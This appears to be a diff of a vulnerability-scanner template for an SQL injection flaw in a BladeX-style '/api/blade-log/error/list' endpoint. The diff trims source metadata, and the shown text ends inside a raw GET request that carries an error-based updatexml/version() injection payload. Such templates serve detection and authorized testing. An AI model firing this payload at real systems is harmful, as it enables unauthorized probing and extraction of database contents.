@@ -3,14 +3,8 @@ info:
   name: list存在SQL 注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nn36fv8yew6qyvbc
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nn36fv8yew6qyvbc
-    fofa: body="https://bladex.vip"
 http:
 - raw:
   - 'GET /api/blade-log/error/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1 HTTP/1.1
